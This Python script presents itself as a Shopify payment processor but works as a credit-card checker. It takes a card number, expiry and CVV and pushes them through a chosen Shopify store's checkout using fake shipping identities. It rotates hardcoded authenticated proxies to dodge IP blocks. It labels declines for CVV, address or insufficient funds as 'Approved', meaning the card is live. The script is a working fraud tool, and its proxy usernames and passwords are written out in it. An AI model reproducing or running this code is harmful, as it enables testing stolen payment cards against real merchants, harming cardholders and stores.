import requests
import random
import string
import json
import time
import urllib.parse
import re
import os
from urllib.parse import urlparse, parse_qs

class ShopifyPaymentProcessor:
    def __init__(self, custom_proxy=None):
        self.session = requests.Session()
        self.retry_count = 0
        self.max_retries = 4
        self.proxies = [
            "175.29.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
            "46.3.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
            "158.46.160.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
            "37.218.219.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
            "46.3.63.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
            "37.218.221.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
            "81.180.253.7:5433:1ADM7A56GE0B:8YD2Y736XJ10",
            "178.171.88.7:5433:1ADM7A56GE0B:8YD2Y736XJ10",
            "85.28.57.8:5433:1ADM7A56GE0B:8YD2Y736XJ10",
            "45.140.172.7:5433:1ADM7A56GE0B:8YD2Y736XJ10",
            "91.108.230.8:5433:1ADM7A56GE0B:8YD2Y736XJ10",
            "178.171.106.8:5433:1ADM7A56GE0B:8YD2Y736XJ10"
        ]
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        self.custom_proxy = custom_proxy
        self.setup_proxy()

    def setup_proxy(self):
        if self.custom_proxy:
            # Use custom proxy if provided
            try:
                parts = self.custom_proxy.split(':')
                if len(parts) == 2:  # IP:PORT format
                    proxy_url = f"http://{parts[0]}:{parts[1]}"
                elif len(parts) == 4:  # IP:PORT:USER:PASS format
                    proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                else:
                    # Invalid format, fall back to default proxies
                    proxy_str = random.choice(self.proxies)
                    parts = proxy_str.split(':')
                    proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            except Exception:
                # If any error occurs, fall back to default proxies
                proxy_str = random.choice(self.proxies)
                parts = proxy_str.split(':')
                proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            # Use random proxy from the list
            proxy_str = random.choice(self.proxies)
            parts = proxy_str.split(':')
            proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            
        self.session.proxies = {'http': proxy_url, 'https': proxy_url}

    def generate_random_string(self, length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def extract_between(self, text, start, end):
        try:
            start_idx = text.find(start)
            if start_idx == -1:
                return None
            start_idx += len(start)
            end_idx = text.find(end, start_idx)
            if end_idx == -1:
                return None
            return text[start_idx:end_idx]
        except:
            return None

    def extract_patterns(self, text, patterns):
        results = []
        for pattern in patterns:
            try:
                # Escape special regex characters in the pattern parts
                start_pattern = re.escape(pattern[0])
                end_pattern = re.escape(pattern[1])
                regex_pattern = f"{start_pattern}(.*?){end_pattern}"
                matches = re.findall(regex_pattern, text)
                results.append(matches)
            except Exception as e:
                print(f"Regex error: {str(e)}")
                results.append([])
        return results

    def format_month(self, month):
        return str(int(month)) if month.startswith('0') else month

    def get_user_data(self, nat="US"):
        if nat == "AU":
            return {
                'email': f"test{random.randint(1000, 9999)}@example.com",
                'first_name': "John",
                'last_name': "Smith",
                'city': "Hambidge",
                'street': "56 Bayview Road",
                'state': "South Australia",
                'zip': "5642",
                'country': "Australia"
            }
        else:
            return {
                'email': f"test{random.randint(1000, 9999)}@example.com",
                'first_name': "John",
                'last_name': "Doe",
                'city': "New York",
                'street': "118 W 132nd St",
                'state': "New York",
                'zip': "10027",
                'country': "United States"
            }

    def process_payment(self, cc, month, year, cvv, site_url):
        try:
            if len(year) <= 2:
                year = f"20{year}"
            
            sub_month = self.format_month(month)
            parsed_url = urlparse(site_url)
            domain = parsed_url.netloc
            
            cookie_id = self.generate_random_string(10)
            self.session.headers.update({
                'User-Agent': self.user_agent,
                'Host': domain,
                'Origin': f"https://{domain}",
                'Referer': site_url
            })

            response1 = self.session.get(site_url)
            if response1.status_code == 430:
                return {'status': False, 'message': 'IP blocked, change IP'}

            variants = self.extract_patterns(response1.text, [['"variants":[{"id":', ',"']])
            if not variants or not variants[0]:
                return {'status': False, 'message': 'No product variants found'}
            
            cart_id = variants[0][0]
            
            cart_response = self.add_to_cart(domain, cart_id)
            if not cart_response['success']:
                return cart_response

            checkout_url = self.get_checkout_url(domain)
            if not checkout_url:
                return {'status': False, 'message': 'Failed to get checkout URL'}

            user_data = self.get_user_data()
            
            shipping_response = self.submit_shipping_info(checkout_url, user_data)
            if not shipping_response['success']:
                return shipping_response

            payment_response = self.process_card_payment(
                checkout_url, domain, cc, month, year, cvv, user_data
            )
            
            return payment_response

        except Exception as e:
            return {'status': False, 'message': f'Error: {str(e)}'}

    def add_to_cart(self, domain, cart_id):
        # Try multiple cart endpoints to ensure compatibility with different Shopify stores
        cart_endpoints = [
            f"https://{domain}/cart/add.js",
            f"https://{domain}/cart/add",
            f"https://{domain}/cart/add.json"
        ]
        
        data = {
            'id': cart_id,
            'quantity': 1,
            'form_type': 'product'
        }
        
        for endpoint in cart_endpoints:
            try:
                # Try both form data and JSON formats
                response = self.session.post(endpoint, data=data)
                
                # Check if the request was successful
                if response.status_code == 200:
                    # Check if we got a JSON response
                    try:
                        json_response = response.json()
                        if 'items' in json_response or 'id' in json_response:
                            return {'success': True, 'cart_data': json_response}
                    except:
                        pass
                    
                    # If we got redirected to the cart page, it's also a success
                    if '/cart' in response.url:
                        return {'success': True}
                
                # Try with JSON payload
                json_response = self.session.post(endpoint, json=data)
                if json_response.status_code == 200:
                    return {'success': True}
            except Exception as e:
                print(f"Error adding to cart with {endpoint}: {str(e)}")
                continue
        
        # If we've tried all endpoints and none worked, try a direct GET to the cart
        try:
            cart_response = self.session.get(f"https://{domain}/cart")
            if cart_response.status_code == 200:
                return {'success': True}
        except:
            pass
            
        # If we reach here, we couldn't add to cart
        return {'success': False, 'message': 'Failed to add product to cart'}

    def get_checkout_url(self, domain):
        try:
            # First try the standard checkout endpoint
            response = self.session.get(f"https://{domain}/checkout")
            
            # Check if we were redirected to a checkout URL
            if 'checkout' in response.url:
                parsed_url = urlparse(response.url)
                checkout_path = parsed_url.path
                
                # Extract the checkout token from the URL
                if '/checkouts/' in checkout_path:
                    return f"{domain}{checkout_path}"
            
            # If we didn't get redirected, try to extract the location from headers or response
            location = None
            
            # Check for location in response headers
            if 'Location' in response.headers:
                location = response.headers['Location']
            
            # If not in headers, try to extract from the response text
            if not location:
                location = self.extract_between(response.text, 'location: ', '\n')
                
            if not location:
                # Try to find checkout URL in the HTML
                checkout_match = re.search(r'action="([^"]*\/checkout[^"]*)"', response.text)
                if checkout_match:
                    checkout_url = checkout_match.group(1)
                    if checkout_url.startswith('/'):
                        return f"{domain}{checkout_url}"
                    return checkout_url
            
            # If we found a location, parse it
            if location:
                parsed = urlparse(location.strip())
                if parsed.netloc:
                    return f"{parsed.netloc}{parsed.path}".rstrip('_')
                return f"{domain}{parsed.path}".rstrip('_')
            
            # If all else fails, try the cart endpoint and look for checkout links
            cart_response = self.session.get(f"https://{domain}/cart")
            checkout_link = re.search(r'href="([^"]*\/checkout[^"]*)"', cart_response.text)
            if checkout_link:
                checkout_url = checkout_link.group(1)
                if checkout_url.startswith('/'):
                    return f"{domain}{checkout_url}"
                return checkout_url
                
            return None
        except Exception as e:
            print(f"Error getting checkout URL: {str(e)}")
            return None

    def submit_shipping_info(self, checkout_url, user_data):
        try:
            # First, get the checkout page to extract the authenticity token
            # Make sure checkout_url is properly formatted
            if checkout_url.startswith('https://') or checkout_url.startswith('http://'):
                checkout_page_url = checkout_url
            else:
                checkout_page_url = f"https://{checkout_url}"
                
            print(f"Getting checkout page: {checkout_page_url}")
            checkout_response = self.session.get(checkout_page_url)
            
            # Extract authenticity token from the page
            auth_token = None
            auth_token_match = re.search(r'name="authenticity_token" value="([^"]+)"', checkout_response.text)
            if auth_token_match:
                auth_token = auth_token_match.group(1)
            else:
                # If we can't find the token, generate a random one as fallback
                auth_token = self.generate_random_string(86)
            
            # Prepare shipping data
            shipping_data = {
                '_method': 'patch',
                'authenticity_token': auth_token,
                'previous_step': 'contact_information',
                'step': 'shipping_method',
                'checkout[email]': user_data['email'],
                'checkout[shipping_address][first_name]': user_data['first_name'],
                'checkout[shipping_address][last_name]': user_data['last_name'],
                'checkout[shipping_address][address1]': user_data['street'],
                'checkout[shipping_address][city]': user_data['city'],
                'checkout[shipping_address][country]': user_data['country'],
                'checkout[shipping_address][province]': user_data['state'],
                'checkout[shipping_address][zip]': user_data['zip'],
                'checkout[shipping_address][phone]': '9006371822'
            }
            
            # Some Shopify stores require additional fields
            shipping_data['checkout[remember_me]'] = '0'
            shipping_data['checkout[client_details][browser_width]'] = '1920'
            shipping_data['checkout[client_details][browser_height]'] = '1080'
            shipping_data['checkout[client_details][javascript_enabled]'] = '1'
            
            # Submit shipping information
            response = self.session.post(checkout_page_url, data=shipping_data)
            
            # Check if we need to select a shipping method
            if 'step=shipping_method' in response.url or 'shipping_method' in response.text:
                # Extract shipping method options
                shipping_method = None
                shipping_method_match = re.search(r'data-shipping-method="([^"]+)"', response.text)
                if shipping_method_match:
                    shipping_method = shipping_method_match.group(1)
                
                if shipping_method:
                    # Submit shipping method selection
                    shipping_method_data = {
                        '_method': 'patch',
                        'authenticity_token': auth_token,
                        'previous_step': 'shipping_method',
                        'step': 'payment_method',
                        'checkout[shipping_rate][id]': urllib.parse.unquote(shipping_method)
                    }
                    
                    shipping_method_response = self.session.post(checkout_page_url, data=shipping_method_data)
                    return {'success': shipping_method_response.status_code == 200}
            
            return {'success': response.status_code == 200}
        except Exception as e:
            print(f"Error submitting shipping info: {str(e)}")
            return {'success': False, 'message': str(e)}

    def get_shipping_rates(self, checkout_url):
        time.sleep(5)
        # Make sure checkout_url is properly formatted
        if checkout_url.startswith('https://') or checkout_url.startswith('http://'):
            shipping_rates_url = f"{checkout_url}/shipping_rates?step=shipping_method"
        else:
            shipping_rates_url = f"https://{checkout_url}/shipping_rates?step=shipping_method"
            
        print(f"Getting shipping rates from: {shipping_rates_url}")
        response = self.session.get(shipping_rates_url)
        
        shipping_method = self.extract_between(response.text, 'data-shipping-method="', '"')
        payment_gateway = self.extract_between(response.text, '[data-select-gateway=', ']')
        
        if not shipping_method and self.retry_count < self.max_retries:
            self.retry_count += 1
            return self.get_shipping_rates(checkout_url)
        
        return {
            'shipping_method': urllib.parse.unquote(shipping_method) if shipping_method else None,
            'payment_gateway': payment_gateway
        }

    def process_card_payment(self, checkout_url, domain, cc, month, year, cvv, user_data):
        try:
            # Get the payment page to extract necessary tokens and gateway information
            checkout_page_url = f"https://{checkout_url}"
            payment_page_response = self.session.get(checkout_page_url)
            
            # Extract authenticity token
            auth_token = None
            auth_token_match = re.search(r'name="authenticity_token" value="([^"]+)"', payment_page_response.text)
            if auth_token_match:
                auth_token = auth_token_match.group(1)
            else:
                auth_token = self.generate_random_string(86)
            
            # Extract payment gateway
            payment_gateway = None
            gateway_match = re.search(r'data-select-gateway="([^"]+)"', payment_page_response.text)
            if gateway_match:
                payment_gateway = gateway_match.group(1)
            
            # If we couldn't find the payment gateway, try to get shipping rates
            if not payment_gateway:
                rates = self.get_shipping_rates(checkout_url)
                payment_gateway = rates.get('payment_gateway')
            
            # If we still don't have a payment gateway, try to find it in other ways
            if not payment_gateway:
                gateway_match = re.search(r'data-gateway-name="([^"]+)"', payment_page_response.text)
                if gateway_match:
                    payment_gateway = gateway_match.group(1)
            
            # If we still don't have a payment gateway, use a default value
            if not payment_gateway:
                payment_gateway = "shopify_payments"
            
            # Format month and year
            sub_month = self.format_month(month)
            if len(year) <= 2:
                year = f"20{year}"
            
            # Prepare card session data
            card_session_data = {
                "credit_card": {
                    "number": cc,
                    "name": f"{user_data['first_name']} {user_data['last_name']}",
                    "month": int(sub_month),
                    "year": int(year),
                    "verification_value": cvv
                },
                "payment_session_scope": domain
            }
            
            # Try multiple Shopify payment endpoints
            session_endpoints = [
                "https://deposit.us.shopifycs.com/sessions",
                "https://elb.deposit.shopifycs.com/sessions",
                "https://checkout.shopifycs.com/sessions",
                f"https://{domain}/wallets/checkouts/{checkout_url.split('/')[-1]}/payment_sessions"
            ]
            
            session_id = None
            for endpoint in session_endpoints:
                try:
                    session_response = self.session.post(
                        endpoint,
                        json=card_session_data,
                        headers={'Content-Type': 'application/json'}
                    )
                    
                    if session_response.status_code == 200:
                        try:
                            session_data = session_response.json()
                            if 'id' in session_data:
                                session_id = session_data['id']
                                break
                        except:
                            pass
                        
                        # Try to extract session ID from response text
                        id_match = re.search(r'"id"\s*:\s*"([^"]+)"', session_response.text)
                        if id_match:
                            session_id = id_match.group(1)
                            break
                except Exception as e:
                    print(f"Error with payment endpoint {endpoint}: {str(e)}")
                    continue
            
            # If we couldn't get a session ID, try an alternative approach
            if not session_id:
                # Look for a payment form in the page
                payment_form_match = re.search(r'<form[^>]*action="([^"]*payment[^"]*)"', payment_page_response.text)
                if payment_form_match:
                    payment_form_url = payment_form_match.group(1)
                    if payment_form_url.startswith('/'):
                        payment_form_url = f"https://{domain}{payment_form_url}"
                    
                    # Submit card details directly to the payment form
                    direct_payment_data = {
                        'credit_card[name]': f"{user_data['first_name']} {user_data['last_name']}",
                        'credit_card[number]': cc,
                        'credit_card[month]': sub_month,
                        'credit_card[year]': year,
                        'credit_card[verification_value]': cvv
                    }
                    
                    direct_payment_response = self.session.post(payment_form_url, data=direct_payment_data)
                    
                    # Check if payment was successful
                    if 'thank_you' in direct_payment_response.url:
                        return {
                            'status': True,
                            'result': 'Approved - Charged',
                            'message': 'Payment successful',
                            'gateway': self.determine_gateway_type(None, checkout_url)
                        }
                    
                    # If not successful, try to parse the error message
                    error_message = None
                    error_match = re.search(r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>', direct_payment_response.text, re.DOTALL)
                    if error_match:
                        error_message = error_match.group(1).strip()
                        error_message = re.sub(r'<[^>]*>', '', error_message)  # Remove HTML tags
                    
                    return self.parse_payment_result(direct_payment_response.text, checkout_url, error_message)
            
            # If we have a session ID, proceed with the standard payment flow
            if session_id:
                payment_data = {
                    '_method': 'patch',
                    'authenticity_token': auth_token,
                    'previous_step': 'payment_method',
                    'step': '',
                    's': session_id,
                    'checkout[payment_gateway]': payment_gateway,
                    'checkout[credit_card][vault]': 'false',
                    'checkout[different_billing_address]': 'false',
                    'checkout[remember_me]': 'false',
                    'checkout[total]': '',  # This will be filled by the server
                    'complete': '1'
                }
                
                payment_response = self.session.post(checkout_page_url, data=payment_data)
                
                # Wait for payment processing
                time.sleep(3)
                
                # Check if we were redirected to the thank you page
                if 'thank_you' in payment_response.url:
                    return {
                        'status': True,
                        'result': 'Approved - Charged',
                        'message': 'Payment successful',
                        'gateway': self.determine_gateway_type(None, checkout_url)
                    }
                
                # If not, check the processing page
                validation_response = self.session.get(f"{checkout_page_url}?from_processing_page=1&validate=true")
                
                return self.parse_payment_result(validation_response.text, checkout_url)
            
            # If we reach here, we couldn't process the payment
            return {'status': False, 'message': 'Failed to process payment', 'result': 'Error', 'gateway': 'Unknown'}
            
        except Exception as e:
            print(f"Error processing card payment: {str(e)}")
            return {'status': False, 'message': f'Error: {str(e)}', 'result': 'Error', 'gateway': 'Unknown'}

    def parse_payment_result(self, response_text, checkout_url, error_message=None):
        # First check if we have an explicit error message
        message = error_message
        
        # If not, try to extract it from the response
        if not message:
            # Try multiple patterns to extract error messages
            message_patterns = [
                ('<p class="notice__text">', '</p></div></div>'),
                ('<div class="notice__content">', '</div>'),
                ('<div class="error">', '</div>'),
                ('<div class="alert alert-danger">', '</div>'),
                ('<span class="error-message">', '</span>'),
                ('data-error-message="', '"')
            ]
            
            for pattern in message_patterns:
                extracted = self.extract_between(response_text, pattern[0], pattern[1])
                if extracted:
                    message = extracted.strip()
                    # Remove HTML tags
                    message = re.sub(r'<[^>]*>', '', message)
                    message = message.strip()
                    break
        
        # Determine the gateway type
        gateway_type = self.determine_gateway_type(message, checkout_url)
        
        # Check for successful payment
        if 'thank_you' in response_text or '/thank_you' in response_text:
            return {
                'status': True,
                'result': 'Approved - Charged',
                'message': 'Payment successful',
                'gateway': gateway_type
            }
        
        # Check for various approval scenarios
        if self.is_cvv_error(message):
            return {
                'status': True,
                'result': 'Approved - CVV',
                'message': message or 'CVV verification failed but card is valid',
                'gateway': gateway_type
            }
        elif self.is_avs_error(message):
            return {
                'status': True,
                'result': 'Approved - AVS',
                'message': message or 'Address verification failed but card is valid',
                'gateway': gateway_type
            }
        elif self.is_insufficient_funds(message):
            return {
                'status': True,
                'result': 'Approved - Insufficient Funds',
                'message': message or 'Insufficient funds but card is valid',
                'gateway': gateway_type
            }
        
        # Check for 3D Secure or additional verification
        if '3d secure' in response_text.lower() or 'verification' in response_text.lower():
            return {
                'status': True,
                'result': 'Approved - 3D Secure',
                'message': 'Card requires 3D Secure verification',
                'gateway': gateway_type
            }
        
        # Default to declined
        return {
            'status': False,
            'result': 'Declined',
            'message': message or 'Transaction declined',
            'gateway': gateway_type
        }

    def determine_gateway_type(self, message, checkout_url):
        if not message:
            return "Shopify"
        
        braintree_messages = ["2010 Card Issuer Declined CVV", "2047 Call Issuer", "2007 No Account"]
        if any(msg in message for msg in braintree_messages):
            return "Shopify + Braintree"
        
        if "CVV does not match" in message:
            return "Shopify + Spreedly"
        
        if "CVD ERROR" in message or "AUTH DECLINED" in message:
            return "Shopify + Moneris"
        
        if "Transaction Normal" in message:
            return "Shopify + Payeezy"
        
        if "CVV2 Mismatch" in message and "10502" in message:
            return "Shopify + Payflow"
        
        if "CVC Declined" in message or "Issuer Suspected Fraud" in message:
            return "Shopify + Adyen"
        
        if '/checkouts/c/' in checkout_url:
            return "Shopify + Stripe"
        
        return "Shopify"

    def is_cvv_error(self, message):
        cvv_errors = ["CVV does not match", "CVC Declined", "CVV2 Mismatch", "Security codes does not match"]
        return any(error in message for error in cvv_errors) if message else False

    def is_avs_error(self, message):
        avs_errors = ["AVS", "Address not Verified", "avs"]
        return any(error in message for error in avs_errors) if message else False

    def is_insufficient_funds(self, message):
        fund_errors = ["Insufficient Funds", "Insuff Funds", "Credit Floor"]
        return any(error in message for error in fund_errors) if message else False

def process_shopify_payment(cc, month, year, cvv, site_url):
    processor = ShopifyPaymentProcessor()
    return processor.process_payment(cc, month, year, cvv, site_url)

def main():
    # Prompt the user for input
    cc = input("Enter credit card number: ")
    month = input("Enter expiration month: ")
    year = input("Enter expiration year: ")
    cvv = input("Enter CVV: ")
    site_url = input("Enter site URL: ")

    # Process the payment
    result = process_shopify_payment(cc, month, year, cvv, site_url)

    # Print the result
    print(json.dumps(result, indent=2))
    
if __name__ == "__main__":
    main()